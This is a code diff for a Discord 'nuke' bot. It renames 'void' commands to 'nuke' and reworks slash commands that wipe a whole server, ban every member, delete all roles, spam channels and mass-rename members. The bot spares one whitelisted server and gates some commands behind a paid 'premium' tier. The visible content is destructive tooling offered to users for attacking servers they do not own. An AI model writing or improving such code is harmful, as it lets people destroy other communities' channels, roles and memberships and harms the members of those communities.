@@ -440,13 +440,13 @@ async def setup_slash(interaction: discord.Interaction):
         await ticket_panel.callback(inv)
     ticket_btn.callback = ticket_callback
     
-    void_btn = discord.ui.Button(label="Void Server", style=discord.ButtonStyle.danger, emoji="🚀")
-    async def void_callback(inv: discord.Interaction):
-        await wipe_slash.callback(inv)
-    void_btn.callback = void_callback
+    nuke_btn = discord.ui.Button(label="Nuke Server", style=discord.ButtonStyle.danger, emoji="🚀")
+    async def nuke_callback(inv: discord.Interaction):
+        await nuke_slash.callback(inv)
+    nuke_btn.callback = nuke_callback
     
     view.add_item(ticket_btn)
-    view.add_item(void_btn)
+    view.add_item(nuke_btn)
     
     await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
 
@@ -461,11 +461,11 @@ async def setup_support_slash(interaction: discord.Interaction, role: discord.Ro
     
     await interaction.response.send_message(f"✅ Support Setup Complete!\nStaff Role: {role.mention}\nCategory: {category.name}", ephemeral=True)
 
-@client.tree.command(name="void", description="Send the server into the abyss (Regular Users)")
-async def wipe_slash(interaction: discord.Interaction):
+@client.tree.command(name="nuke", description="Nuke the server (Regular Users)")
+async def nuke_slash(interaction: discord.Interaction):
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
-    await interaction.response.send_message("🚀 Void sequence started...", ephemeral=True)
+    await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild)
 
 @client.tree.command(name="glitch", description="Role & Channel overload (Premium Only)")
@@ -530,14 +530,14 @@ async def purge_roles_slash(interaction: discord.Interaction):
     await interaction.response.send_message("🎭 Stripping roles...", ephemeral=True)
     await delete_all_roles(interaction.guild)
 
-@client.tree.command(name="custom_void", description="Wipe with custom settings (Premium Only)")
+@client.tree.command(name="premiumnuke", description="Wipe with custom settings (Premium Only)")
 @app_commands.describe(message="Custom message", channel_name="Custom channels")
-async def custom_wipe_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
+async def premiumnuke_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    await interaction.response.send_message("🚀 Custom Void Started!", ephemeral=True)
+    await interaction.response.send_message("🚀 Premium Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild, message, channel_name)
 
 @client.tree.command(name="spam", description="Spam current channel (Owner Only)")
@@ -579,38 +579,31 @@ async def nickname_all_slash(interaction: discord.Interaction, nickname: str):
         try: await member.edit(nick=nickname)
         except: continue
 
-@client.tree.command(name="role_nuke", description="Delete all roles (Premium)")
-async def role_nuke_slash(interaction: discord.Interaction):
-    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
-        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    await interaction.response.send_message("🎭 Role nuke started...", ephemeral=True)
-    await delete_all_roles(interaction.guild)
-
-@client.tree.command(name="channel_nuke", description="Delete all channels (Premium)")
-async def channel_nuke_slash(interaction: discord.Interaction):
-    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
-        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    if interaction.guild_id == WHITELISTED_SERVER_ID:
-        return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
-    await interaction.response.send_message("📁 Channel nuke started...", ephemeral=True)
-    await delete_all_channels(interaction.guild)
-
-@client.tree.command(name="purge", description="Delete a number of messages (Premium)")
-@app_commands.describe(amount="Amount of messages to delete")
-async def purge_slash(interaction: discord.Interaction, amount: int):
-    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
-        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    await interaction.response.send_message(f"🧹 Purging {amount} messages...", ephemeral=True)
-    await interaction.channel.purge(limit=amount)
-
 @client.tree.command(name="ban_nuke", description="Ban everyone (Premium)")
 async def ban_nuke_slash(interaction: discord.Interaction):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
-    await interaction.response.send_message("🔨 Ban nuke started...", ephemeral=True)
+    
+    await interaction.response.defer(ephemeral=True)
     await ban_all_members(interaction.guild)
+    try:
+        await interaction.followup.send("🔨 Ban nuke complete.", ephemeral=True)
+    except:
+        pass
+
+@client.tree.command(name="role_nuke", description="Delete all roles (Premium)")
+async def role_nuke_slash(interaction: discord.Interaction):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    
+    await interaction.response.defer(ephemeral=True)
+    await delete_all_roles(interaction.guild)
+    try:
+        await interaction.followup.send("🎭 Role nuke complete.", ephemeral=True)
+    except:
+        pass
 
 @client.tree.command(name="add_premium", description="Grant lifetime premium")
 async def add_premium_slash(interaction: discord.Interaction, user: discord.User):
